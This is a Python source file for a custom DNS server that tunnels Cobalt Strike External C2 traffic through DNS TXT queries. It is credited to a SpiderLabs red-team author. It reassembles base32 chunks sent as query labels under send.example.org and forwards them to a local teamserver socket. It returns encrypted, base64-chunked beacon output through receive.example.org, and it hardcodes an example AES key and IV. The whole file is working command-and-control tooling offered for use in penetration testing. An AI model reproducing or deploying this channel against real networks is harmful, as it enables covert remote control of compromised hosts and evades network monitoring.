#
# Custom DNS Server for Cobalt Strike External C2
# built a for DNS over HTTP (DoH) channel created for
# https://github.com/ryhanson/ExternalC2
#
# David Middlehurst @dtmsecurity, SpiderLabs - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Acknowledgements / Thanks:
#  - DNS Server:
# 	https://github.com/pawitp/acme-dns-server
#  - Python - Teamserver Sockets Tips and Tricks
# 	https://github.com/outflanknl/external_c2
# 	https://github.com/Und3rf10w/external_c2_framework
#  - C# framework (Other End)
# 	https://github.com/ryhanson/ExternalC2
import io
import struct
import socketserver
import sqlite3
import re
import socket
import ssl
import base64
from io import BytesIO
from Crypto.Cipher import AES

HEADER = '!HBBHHHH'
HEADER_SIZE = struct.calcsize(HEADER)
DOMAIN_PATTERN = re.compile('^[A-Za-z0-9\-\.\_]+$')

INPUTDOMAIN = 'send.example.org'
OUTPUTDOMAIN = 'receive.example.org'

socketHandles = dict()
outputSessions = dict()

PORT = 53

db = sqlite3.connect('dns.sqlite')

cursor = db.cursor()
cursor.execute('CREATE TABLE IF NOT EXISTS inputsessions(id INTEGER PRIMARY KEY, session TEXT, handle TEXT, length INTEGER)') 
cursor.execute('CREATE TABLE IF NOT EXISTS input(id INTEGER PRIMARY KEY, session TEXT, pos INTEGER, data TEXT)')   
db.commit()
db.close()

def encrypt(plain):
    try:
        # Change the below Key and IV below are random examples
        key = base64.b64decode("hRUuLu7B61rgSWd/kQEGFjK7367/9gn+Mucl6eHCnHw=")
        iv = base64.b64decode("LpriMy1kPv1G1HYkO0kmHQ==")
        encryption_suite = AES.new(key, AES.MODE_CBC, iv)
        cipher_text = encryption_suite.encrypt(plain)
    except:
        cipher_text = b""
    return cipher_text

def createSocket():
    d = {}
    d['sock'] = socket.create_connection(('127.0.0.1', 2222))
    d['state'] = 1
    return (d['sock'])

def send_frame(sock, chunk):
    slen = struct.pack('<I', len(chunk))
    sock.sendall(slen + chunk)

def recv_frame(sock):
    try:
        chunk = sock.recv(4)
    except:
        return("")
    if len(chunk) < 4:
        return()
    slen = struct.unpack('<I', chunk)[0]
    chunk = sock.recv(slen)
    while len(chunk) < slen:
        chunk = chunk + sock.recv(slen - len(chunk))
    return(encrypt(chunk))

def closeSocket(sock):
    sock.close()

# Base32 padding fixer
# https://github.com/Arno0x/DNSExfiltrator
def fromBase32(encoded):
    mod = len(encoded) % 8
    if mod == 2:
        padding = "======"
    elif mod == 4:
        padding = "===="
    elif mod == 5:
        padding = "==="
    elif mod == 7:
        padding = "="
    else:
        padding = ""
    return base64.b32decode(encoded.upper() + padding)

def inputHandler(query):
    labels = query.replace("." + INPUTDOMAIN,"").split(".")

    if len(labels) == 1:
        handle = labels[0]
        socketHandles[handle] = createSocket()

    if len(labels) == 3:
        handle = labels[0]
        length = int(labels[1])
        session = labels[2]
        db = sqlite3.connect('dns.sqlite')
        cursor = db.cursor()
        cursor.execute('''INSERT INTO inputsessions (length, session, handle) VALUES (?,?,?)''',(length,session,handle))
        db.commit()
        db.close()
        print("Created session '%s' length '%s' handle '%s'" % (session,length,handle))

    if len(labels) >= 4:
        handle = labels[0]
        pos = int(labels[1])
        session = labels[2]
        data = ""
        n = 0
        for c in labels:
            if n > 2:
                data += c
            n+=1
        db = sqlite3.connect('dns.sqlite')
        cursor = db.cursor()
        cursor.execute('''INSERT INTO input (session, pos, data) VALUES (?,?,?)''',(session,pos,data))
        db.commit()
        db.close()
        print("Chunk received for session '%s' pos '%s'" % (session,pos))

        db = sqlite3.connect('dns.sqlite')
        process(session,db)
        db.close()
    answers = []
    answers.append("ACK")
    return answers

def process(session,db):
        cursor = db.cursor()
        cursor.execute('SELECT length,handle FROM inputsessions WHERE session = ? LIMIT 1',(session,))
        size = 0
        handle = ""
        for result in cursor:
            size = int(result[0])
            handle = str(result[1])

        cursor = db.cursor()
        cursor.execute('SELECT DISTINCT(pos) FROM input WHERE session = ?',(session,))
        found = 0
        for result in cursor:
            found+=1
        print("We have %s of %s for session '%s'" % (found,size,session))
        if found > 0 and found == size:
            cursor = db.cursor()
            cursor.execute('SELECT pos,data FROM input WHERE session = ? ORDER BY pos ASC',(session,))
            troops = dict()
            for result in cursor:
                troops[int(result[0])] = str(result[1])
            assembled = ""
            for k, v in troops.items():
                assembled += v
            decoded = fromBase32(assembled)

            if handle in socketHandles:
                teamserversock = socketHandles[handle]
                send_frame(teamserversock, decoded)

            cursor = db.cursor()
            cursor.execute('DELETE FROM input WHERE session = ?',(session,))
            db.commit()
            cursor = db.cursor()
            cursor.execute('DELETE FROM inputsessions WHERE session = ?',(session,))
            db.commit()

def outputHandler(query):
    answers_output = []
    labels = query.replace("." + OUTPUTDOMAIN,"").split(".")

    if len(labels) == 3:
        handle = labels[0]
        pos = int(labels[1])
        session = labels[2]
        if session not in outputSessions.keys():
            print("no session %s" % session)
            alldata = ""
        else:
            alldata = outputSessions[session]
        max = 255
        data_items = [alldata[i:i+max] for i in range(0, len(alldata), max)]

        max_records = 1
        record = 0

        while record < max_records:
            if pos < len(data_items):
                answers_output.append(data_items[pos])
                pos += 1
            record += 1

        if pos >= len(data_items):
            outputSessions.pop(session, None)

        if len(data_items) == 0:
            answers_output.append("EOFEOFEOFEOF")


    if len(labels) == 2:
        handle = labels[0]
        session = labels[1]
        if session in outputSessions.keys():
            alldata = outputSessions[session]
            max = 255
            data_items = [alldata[i:i+max] for i in range(0, len(alldata), max)]
            answers_output.append(str(len(data_items)))
        else:
            if handle in socketHandles:
                teamserversock = socketHandles[handle]
                teamserversock.settimeout(1)
                buf =  recv_frame(teamserversock)
                if len(buf) > 0:
                    alldata = base64.b64encode(buf).decode()
                    outputSessions[session] = alldata
                    max = 255
                    data_items = [alldata[i:i+max] for i in range(0, len(alldata), max)]
                    answers_output.append(str(len(data_items)))
                else:
                    answers_output.append("None")
            else:
                answers_output.append("NH")
    return answers_output

class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):

        socket = self.request[1]
        data = self.request[0]
        data_stream = io.BytesIO(data)

        # Read header
        (request_id, header_a, header_b, qd_count, an_count, ns_count, ar_count) = struct.unpack(HEADER, data_stream.read(HEADER_SIZE))

        # Read questions
        questions = []
        for i in range(qd_count):
            name_parts = []
            length = struct.unpack('B', data_stream.read(1))[0]
            while length != 0:
                name_parts.append(data_stream.read(length).decode('us-ascii'))
                length = struct.unpack('B', data_stream.read(1))[0]
            name = '.'.join(name_parts)

        if not DOMAIN_PATTERN.match(name):
            print('Invalid domain received: ' + name)
            return

        (qtype, qclass) = struct.unpack('!HH', data_stream.read(4))

        questions.append({'name': name, 'type': qtype, 'class': qclass})

        #print('Got request for ' + questions[0]['name'] + ' from ' + str(self.client_address[0]) + ':' + str(self.client_address[1]))
        print('[Incoming DNS Query] ' + questions[0]['name'])

        query = questions[0]['name'];

        answers_response = []

        if INPUTDOMAIN in query:
            answers_response = inputHandler(query)
        if OUTPUTDOMAIN in query:
            answers_response = outputHandler(query)

        # Make response (note: we don't actually care about the questions, just return our canned response)
        response = io.BytesIO()

        # Header
        # Response, Authoriative
        response_header = struct.pack(HEADER, request_id, 0b10000100, 0b00000000, qd_count, len(answers_response), 0, 0)
        response.write(response_header)

        # Questions
        for q in questions:
          # Name
          for part in q['name'].split('.'):
            response.write(struct.pack('B', len(part)))
            response.write(part.encode('us-ascii'))
          response.write(b'\x00')

          # qtype, qclass
          response.write(struct.pack('!HH', q['type'], q['class']))

        # Answers
        print("[Response] %s " % (repr(answers_response)))
        for a in answers_response:
            response.write(b'\xc0\x0c') # Compressed name (pointer to question)
            response.write(struct.pack('!HH', 16, 1)) # type: TXT, class: IN
            response.write(struct.pack('!I', 0)) # TTL: 0
            response.write(struct.pack('!H', len(a) + 1)) # Record length
            response.write(struct.pack('B', len(a))) # TXT length
            response.write(a.encode('us-ascii')) # Text
        # Send response
        socket.sendto(response.getvalue(), self.client_address)

def main():
    server = socketserver.ThreadingUDPServer(('', PORT), DNSHandler)
    print('Running on port %d' % PORT)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()
        for k, v in socketHandles.items():
            closeSocket(v)
    pass

if __name__ == '__main__':
    main()
